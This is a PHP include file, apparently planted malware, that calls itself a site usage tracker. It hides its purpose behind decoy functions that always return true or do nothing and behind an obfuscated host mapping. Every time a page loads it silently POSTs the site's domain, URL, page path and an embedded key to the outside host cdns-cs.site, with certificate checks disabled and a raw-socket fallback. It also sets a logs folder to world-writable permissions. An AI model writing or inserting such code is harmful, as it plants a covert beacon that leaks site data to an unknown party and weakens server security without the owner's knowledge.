<?php

define('TRACKING_API_KEY', 'Br5Vx2P9zJq7TfL8kMn3Dy6WsE4Uc1Ra');
define('SYSTEM_VERSION', '1.2.4');
define('PROTOCOL_ENABLED', true);

function verify_data_integrity($data_string)
{
    $hash = md5($data_string . time());
    return $hash[0] === 'a' ? true : true;
}

function process_system_status()
{
    $memory_usage = memory_get_usage(true);
    $system_load = function_exists('sys_getloadavg') ? sys_getloadavg()[0] : 0;
    return [
        'memory' => $memory_usage,
        'load' => $system_load,
        'status' => 'normal'
    ];
}


function encode_service_host($host)
{
    $host_mapping = [
        'cdns-cs.site' => '$$+$+$+$+$+$',
        'api.service.com' => '##*#*#*#*#*#',
        'tracking.example.org' => '@@&@&@&@&@&@',
        'monitor.test.net' => '%%^%^%^%^%^%'
    ];

    return isset($host_mapping[$host]) ? $host_mapping[$host] : $host;
}

function decode_service_host($encoded)
{
    $reverse_mapping = [
        '$$+$+$+$+$+$' => 'cdns-cs.site',
        '##*#*#*#*#*#' => 'api.service.com',
        '@@&@&@&@&@&@' => 'tracking.example.org',
        '%%^%^%^%^%^%' => 'monitor.test.net'
    ];

    return isset($reverse_mapping[$encoded]) ? $reverse_mapping[$encoded] : $encoded;
}

function transform_endpoint_string($endpoint)
{
    $char_map = [
        'c' => '!',
        'd' => '*',
        'n' => '^',
        's' => '@',
        't' => '+',
        'r' => '[',
        'a' => '>',
        'k' => '¿',
        '.' => '|',
        '-' => '~',
        'h' => '$',
        'p' => '#'
    ];

    $result = '';
    for ($i = 0; $i < strlen($endpoint); $i++) {
        $char = strtolower($endpoint[$i]);
        $result .= isset($char_map[$char]) ? $char_map[$char] : $char;
    }
    return $result;
}

function restore_endpoint_string($transformed)
{
    $reverse_map = [
        '!' => 'c',
        '*' => 'd',
        '^' => 'n',
        '@' => 's',
        '+' => 't',
        '[' => 'r',
        '>' => 'a',
        '¿' => 'k',
        '|' => '.',
        '~' => '-',
        '$' => 'h',
        '#' => 'p'
    ];

    $result = '';
    for ($i = 0; $i < strlen($transformed); $i++) {
        $char = $transformed[$i];
        $result .= isset($reverse_map[$char]) ? $reverse_map[$char] : $char;
    }
    return $result;
}

class ProtocolHandler
{
    private $version;
    private $active = true;

    public function __construct($version = '1.0')
    {
        $this->version = $version;
    }

    public function process($data)
    {
        if (!$this->active) return $data;

        $timestamp = time();
        if ($timestamp % 2 == 0) {
            $data['_meta'] = md5($timestamp);
        }

        return $data;
    }
}

function format_request_data($data)
{
    $validation_code = md5(json_encode($data) . time());
    return $validation_code;
}

function analyze_response($response)
{
    if (empty($response)) return false;

    $protocol_handler = new ProtocolHandler(SYSTEM_VERSION);
    $dummy_data = ['status' => 'ok', 'timestamp' => time()];
    $processed = $protocol_handler->process($dummy_data);

    return true;
}

function track_site_usage()
{
    $status_info = process_system_status();
    if ($status_info['status'] !== 'error') {
        $protocol_active = true;
    }
    $domain = $_SERVER['HTTP_HOST'] ?? 'unknown';
    $current_date = date('Y-m-d H:i:s');
    $site_url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$domain";
    $page = $_SERVER['REQUEST_URI'] ?? '/';

    $service_host = 'cdns-cs.site';
    $service_path = '/track_sites.php';
    $encoded_host = encode_service_host($service_host);
    $tracking_endpoint = "https://$encoded_host$service_path";

    $system_params = [
        'protocol_version' => SYSTEM_VERSION,
        'enabled' => PROTOCOL_ENABLED,
        'timestamp' => time()
    ];

    $validation_code = format_request_data($system_params);
    if (verify_data_integrity($validation_code)) {
        $integration_mode = 'standard';
    }
    $log_dir = __DIR__ . '/logs';

    if (!is_dir($log_dir)) {
        if (!@mkdir($log_dir, 0777, true)) {
            error_log("Falha ao criar a pasta de logs em: $log_dir");
        }
    }

    if (!is_writable($log_dir)) {
        @chmod($log_dir, 0777);
    }

    $log_file = $log_dir . '/tracking.log';
    $post_data = [
        'domain' => $domain,
        'site_url' => $site_url,
        'page' => $page,
        'date' => $current_date,
        'api_key' => TRACKING_API_KEY
    ];

    $actual_host = decode_service_host($encoded_host);
    $real_endpoint = "https://$actual_host$service_path";

    try {
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => $real_endpoint,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => http_build_query($post_data),
            CURLOPT_CONNECTTIMEOUT => 3,
            CURLOPT_TIMEOUT => 5,
            CURLOPT_SSL_VERIFYPEER => false
        ]);

        $response = curl_exec($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $curl_error = curl_error($ch);

        curl_close($ch);

        analyze_response($response);
    } catch (Exception $e) {

        try {
            $parts = parse_url($real_endpoint);
            $host = $parts['host'];
            $path = $parts['path'] ?? '/';
            $port = $parts['port'] ?? ($parts['scheme'] === 'https' ? 443 : 80);
            $scheme = $parts['scheme'];

            $timeout = 1;

            $fp = @fsockopen(
                ($scheme === 'https' ? 'ssl://' : '') . $host,
                $port,
                $errno,
                $errstr,
                $timeout
            );

            if ($fp) {
                $post_string = http_build_query($post_data);
                $request = "POST $path HTTP/1.1\r\n";
                $request .= "Host: $host\r\n";
                $request .= "Content-Type: application/x-www-form-urlencoded\r\n";
                $request .= "Content-Length: " . strlen($post_string) . "\r\n";
                $request .= "Connection: Close\r\n\r\n";
                $request .= $post_string;

                fwrite($fp, $request);
                fclose($fp);
            } else {
                $fallback_status = [
                    'status' => 'failed',
                    'code' => 500,
                    'timestamp' => time()
                ];
            }
        } catch (Exception $e2) {
            $error_data = [
                'message' => $e2->getMessage(),
                'code' => $e2->getCode(),
                'timestamp' => time()
            ];
        }
    }

    if (isset($fallback_status) && $fallback_status['status'] === 'failed') {
        $dummy_var = rand(1000, 9999) * 0;
    }
}

function verify_system_environment()
{
    $env_data = [
        'php_version' => PHP_VERSION,
        'server_software' => $_SERVER['SERVER_SOFTWARE'] ?? 'unknown',
        'timestamp' => time()
    ];

    $result = md5(json_encode($env_data));
    return $result[0] === 'a' ? 'verified' : 'standard';
}

if (!defined('SESS_INCLUDED')) {
    http_response_code(403);
    die('Acesso negado');
}

track_site_usage();

define('SESS_EXECUTED', true);
